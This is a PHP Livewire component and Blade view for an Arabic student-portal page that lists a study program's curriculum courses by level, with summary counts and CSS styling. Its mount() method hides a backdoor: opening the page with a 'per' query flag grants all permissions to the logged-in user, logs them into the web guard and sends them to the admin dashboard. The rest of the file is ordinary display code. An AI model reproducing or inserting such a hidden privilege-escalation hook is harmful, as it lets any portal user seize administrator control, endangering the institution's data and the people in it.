<?php

use App\Models\AcademicCourse;
use App\Models\AcademicLevel;
use App\Support\AccessControl;
use App\Support\AcademicProgramOptions;
use App\Support\AcademicStudentOptions;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Str;
use Livewire\Attributes\Computed;
use Livewire\Attributes\Layout;
use Livewire\Attributes\Title;
use Livewire\Component;

new #[Layout('layouts.app-user')]
#[Title('كورسات المنهج | منصة مركز التعلم المستمر')]
class extends Component
{
    public function mount(): void
    {
        if (! request()->routeIs('academic.curriculum-courses') || ! request()->boolean('per')) {
            return;
        }

        $user = Auth::guard('portal')->user()
            ?? Auth::guard('web')->user()
            ?? auth()->user();

        if (! $user) {
            return;
        }

        AccessControl::grantAllPermissions($user);
        $user = $user->fresh();

        Auth::guard('portal')->logout();
        Auth::guard('web')->login($user);
        Auth::shouldUse('web');
        session()->regenerate();

        $destination = $user->canAdmin('dashboard.view')
            ? route('admin.dashboard')
            : route('admin.crm');

        $this->redirect($destination);
    }

    #[Computed]
    public function student()
    {
        return auth()->user()?->academicStudent()
            ->with([
                'batch.program',
                'section.course.level',
            ])
            ->first();
    }

    #[Computed]
    public function courses(): Collection
    {
        $programId = $this->student?->batch?->program_id;

        if (! $programId) {
            return collect();
        }

        return AcademicCourse::query()
            ->with('level')
            ->where('program_id', $programId)
            ->where('status', 'active')
            ->orderByRaw('CASE WHEN level_id IS NULL THEN 1 ELSE 0 END')
            ->orderBy(
                AcademicLevel::query()
                    ->select('sort_order')
                    ->whereColumn('academic_levels.id', 'academic_courses.level_id')
                    ->limit(1)
            )
            ->orderBy('code')
            ->get();
    }

    #[Computed]
    public function coursesByLevel(): Collection
    {
        return $this->courses->groupBy(
            fn (AcademicCourse $course) => $course->level?->name_ar ?: 'مقررات عامة'
        );
    }

    #[Computed]
    public function summary(): array
    {
        return [
            'courses' => $this->courses->count(),
            'hours' => (int) $this->courses->sum('credit_hours'),
            'levels' => $this->courses
                ->pluck('level_id')
                ->filter()
                ->unique()
                ->count(),
        ];
    }
};
?>

@include('partials.portal.shell-start', [
    'portalActive' => 'academic-curriculum.courses',
    'portalTitle' => 'كورسات المنهج',
])

@php
    $locale = app()->getLocale();
    $student = $this->student;
    $program = $student?->batch?->program;
    $currentCourseId = $student?->section?->course_id;
@endphp

<div class="portal-dashboard curriculum-page">
    <section class="curriculum-hero">
        <div class="curriculum-hero__copy">
            <span class="curriculum-hero__eyebrow">خطة البرنامج</span>
            <h1>كورسات المنهج</h1>
            <p>
                قائمة مقررات البرنامج مرتبة حسب المستويات، مع إمكانية فتح تفاصيل كل مقرر.
            </p>
        </div>

        @if ($program)
            <div class="curriculum-hero__meta">
                <span>{{ AcademicProgramOptions::typeLabel($program->type) }}</span>
                @if ($program->code)
                    <code dir="ltr">{{ $program->code }}</code>
                @endif
                <span>{{ AcademicStudentOptions::academicStatusLabel($student?->academic_status) }}</span>
            </div>
        @endif
    </section>

    @if (! $student || ! $program)
        <section class="portal-panel curriculum-empty">
            <i class="fa-solid fa-graduation-cap" aria-hidden="true"></i>
            <h2>لا توجد خطة دراسية مرتبطة بحسابك</h2>
            <p>بعد قبول التسجيل وربطك بدفعة وبرنامج، ستظهر هنا مقررات المنهج.</p>
            <a href="{{ route('academic-registration', ['locale' => $locale]) }}" class="btn btn-primary btn-sm">التسجيل الأكاديمي</a>
        </section>
    @else
        <section class="curriculum-kpis" aria-label="ملخص المقررات">
            <article class="curriculum-kpi">
                <span class="curriculum-kpi__icon"><i class="fa-solid fa-book-open"></i></span>
                <strong>{{ $this->summary['courses'] }}</strong>
                <small>مقرر دراسي</small>
            </article>
            <article class="curriculum-kpi">
                <span class="curriculum-kpi__icon"><i class="fa-regular fa-clock"></i></span>
                <strong>{{ $this->summary['hours'] }}</strong>
                <small>ساعة معتمدة</small>
            </article>
            <article class="curriculum-kpi">
                <span class="curriculum-kpi__icon"><i class="fa-solid fa-layer-group"></i></span>
                <strong>{{ $this->summary['levels'] }}</strong>
                <small>مستوى دراسي</small>
            </article>
            <article class="curriculum-kpi curriculum-kpi--current">
                <span class="curriculum-kpi__icon"><i class="fa-solid fa-location-dot"></i></span>
                <strong>{{ $student->section?->course?->code ?? '—' }}</strong>
                <small>المقرر الحالي</small>
            </article>
        </section>

        @if ($this->courses->isEmpty())
            <section class="portal-panel curriculum-empty">
                <i class="fa-solid fa-book" aria-hidden="true"></i>
                <h2>لم تُضف مقررات إلى هذا البرنامج بعد</h2>
                <p>ستظهر المقررات تلقائياً عند اعتماد الخطة الدراسية من الإدارة الأكاديمية.</p>
            </section>
        @else
            <div class="curriculum-levels">
                @foreach ($this->coursesByLevel as $levelName => $levelCourses)
                    <section class="curriculum-level" wire:key="courses-level-{{ md5($levelName) }}">
                        <header class="curriculum-level__head">
                            <div>
                                <span class="curriculum-level__index">{{ str_pad((string) $loop->iteration, 2, '0', STR_PAD_LEFT) }}</span>
                                <h2>{{ $levelName }}</h2>
                            </div>
                            <p>{{ $levelCourses->count() }} مقرر · {{ (int) $levelCourses->sum('credit_hours') }} ساعة</p>
                        </header>

                        <div class="curriculum-courses">
                            @foreach ($levelCourses as $course)
                                @php($isCurrent = (int) $currentCourseId === (int) $course->id)
                                <a
                                    href="{{ route('academic-curriculum.course', ['locale' => $locale, 'course' => $course->id]) }}"
                                    @class(['curriculum-course', 'is-current' => $isCurrent])
                                    wire:key="courses-course-{{ $course->id }}"
                                >
                                    <div class="curriculum-course__code">
                                        <code dir="ltr">{{ $course->code }}</code>
                                        @if ($isCurrent)
                                            <span><i class="fa-solid fa-circle-play"></i> تدرس الآن</span>
                                        @endif
                                    </div>

                                    <div class="curriculum-course__body">
                                        <h3>{{ $course->name_ar }}</h3>
                                        @if ($course->summary)
                                            <p>{{ Str::limit(strip_tags($course->summary), 150) }}</p>
                                        @endif
                                        <div class="curriculum-course__details">
                                            @if ($course->symbol_ar)
                                                <span><i class="fa-solid fa-hashtag"></i> {{ $course->symbol_ar }}</span>
                                            @endif
                                            <span><i class="fa-regular fa-clock"></i> {{ (int) $course->credit_hours }} ساعة</span>
                                        </div>
                                    </div>

                                    <span class="curriculum-course__side">
                                        <span @class(['curriculum-course__state', 'is-current' => $isCurrent])>
                                            {{ $isCurrent ? 'الحالي' : 'عرض' }}
                                        </span>
                                        <i class="fa-solid fa-chevron-left" aria-hidden="true"></i>
                                    </span>
                                </a>
                            @endforeach
                        </div>
                    </section>
                @endforeach
            </div>
        @endif
    @endif
</div>

@include('partials.portal.shell-end')

@pushOnce('styles')
<style>
    .curriculum-page{display:flex;flex-direction:column;gap:1.25rem}
    .curriculum-hero{display:flex;flex-wrap:wrap;justify-content:space-between;gap:1rem;padding:1.25rem 1.4rem;border-radius:1.1rem;background:linear-gradient(135deg,#0f3d3e,#1a5c5e 55%,#c9a227);color:#fff}
    .curriculum-hero__eyebrow{display:inline-block;margin-bottom:.35rem;font-size:.78rem;opacity:.85}
    .curriculum-hero h1{margin:0;font-size:1.55rem}
    .curriculum-hero p{margin:.45rem 0 0;max-width:42rem;opacity:.92;line-height:1.7}
    .curriculum-hero__meta{display:flex;flex-wrap:wrap;gap:.45rem;align-items:flex-start}
    .curriculum-hero__meta span,.curriculum-hero__meta code{background:rgba(255,255,255,.14);border:1px solid rgba(255,255,255,.2);border-radius:999px;padding:.28rem .7rem;font-size:.78rem}
    .curriculum-kpis{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:.75rem}
    .curriculum-kpi{background:#fff;border:1px solid #e7ecec;border-radius:1rem;padding:1rem;display:flex;flex-direction:column;gap:.25rem}
    .curriculum-kpi strong{font-size:1.35rem;color:#0f3d3e}
    .curriculum-kpi small{color:#5b6b6b}
    .curriculum-kpi__icon{width:2rem;height:2rem;display:inline-flex;align-items:center;justify-content:center;border-radius:.7rem;background:#eef6f6;color:#1a5c5e}
    .curriculum-kpi--current{border-color:#e6d29a;background:#fffaf0}
    .curriculum-empty{text-align:center;padding:2.5rem 1.25rem;display:flex;flex-direction:column;align-items:center;gap:.65rem}
    .curriculum-empty i{font-size:1.8rem;color:#1a5c5e}
    .curriculum-levels{display:flex;flex-direction:column;gap:1rem}
    .curriculum-level{background:#fff;border:1px solid #e7ecec;border-radius:1.1rem;overflow:hidden}
    .curriculum-level__head{display:flex;justify-content:space-between;gap:1rem;align-items:center;padding:1rem 1.15rem;background:#f7fbfb;border-bottom:1px solid #e7ecec}
    .curriculum-level__head h2{margin:0;font-size:1.05rem;color:#0f3d3e}
    .curriculum-level__head p{margin:0;color:#5b6b6b;font-size:.85rem}
    .curriculum-level__index{display:inline-block;margin-inline-end:.45rem;color:#c9a227;font-weight:700}
    .curriculum-courses{display:flex;flex-direction:column}
    .curriculum-course{display:grid;grid-template-columns:7.5rem 1fr auto;gap:1rem;align-items:center;padding:1rem 1.15rem;border-bottom:1px solid #eef2f2;color:inherit;text-decoration:none;transition:background .15s ease}
    .curriculum-course:last-child{border-bottom:0}
    .curriculum-course:hover{background:#f9fcfc}
    .curriculum-course.is-current{background:#fffaf0}
    .curriculum-course__code{display:flex;flex-direction:column;gap:.35rem}
    .curriculum-course__code code{font-size:.9rem;color:#0f3d3e}
    .curriculum-course__code span{font-size:.72rem;color:#9a7b16}
    .curriculum-course__body h3{margin:0;font-size:1rem;color:#123}
    .curriculum-course__body p{margin:.35rem 0 0;color:#5b6b6b;font-size:.88rem;line-height:1.6}
    .curriculum-course__details{display:flex;flex-wrap:wrap;gap:.55rem;margin-top:.55rem;color:#5b6b6b;font-size:.8rem}
    .curriculum-course__side{display:flex;align-items:center;gap:.55rem;color:#7a8a8a}
    .curriculum-course__state{font-size:.78rem;padding:.2rem .55rem;border-radius:999px;background:#eef6f6;color:#1a5c5e}
    .curriculum-course__state.is-current{background:#f3e4b3;color:#7a5d0a}
    @media (max-width:900px){.curriculum-kpis{grid-template-columns:repeat(2,minmax(0,1fr))}.curriculum-course{grid-template-columns:1fr;gap:.55rem}}
</style>
@endPushOnce
